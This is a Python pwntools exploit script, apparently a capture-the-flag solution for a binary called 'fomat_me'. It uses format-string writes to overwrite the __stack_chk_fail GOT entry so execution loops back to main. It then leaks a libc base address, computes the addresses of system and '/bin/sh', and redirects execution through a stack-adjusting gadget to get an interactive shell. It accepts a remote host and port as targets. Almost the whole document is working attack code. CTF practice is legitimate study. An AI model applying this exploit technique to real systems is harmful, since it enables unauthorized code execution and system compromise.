#!/usr/bin/env python

from pwn import *
import sys



def exploit(r):
	r.recvuntil('echo ')

	stck_chk = 0x804a014
	main     = 0x804851B
	pop_ret  = 0x08048609 #: add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

	payload  = '%8$s'			# 7
	payload += p32(0x804a010)
	payload += p32(stck_chk+2)
	payload += '%%%06dx' % ((main >> 16) - 0x1c)
	payload += '%9$h'
	payload += 'n...'
	payload += p32(stck_chk)
	payload += '%%%06dx' % ((main & 0xffff) - 2059)
	payload += '%14$'
	payload += 'hn..'
	payload += 'A' * 100
	r.sendline(payload)
	data = r.recvuntil('000')
	libc_base = u32(data[:4]) - 0x5f3e0
	r.recvuntil('echo ', timeout=1)
	log.info("libc_base: " + hex(libc_base))
	libc_system = libc_base + 0x3ada0
	libc_binsh = libc_base + 0x15b82b

	payload  = p32(stck_chk)
	payload += '%%%06dx' % (0x8609 - 4)
	payload += '%7$h'
	payload += 'n...'
	payload += 'A' * 8
	payload += p32(libc_system)
	payload += p32(libc_binsh) *2
	r.sendline(payload)
	r.recvuntil('echo ', timeout=1)
	canary = r.recv(10)
	print canary

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./fomat_me'])
        print util.proc.pidof(r)
        pause()
        exploit(r)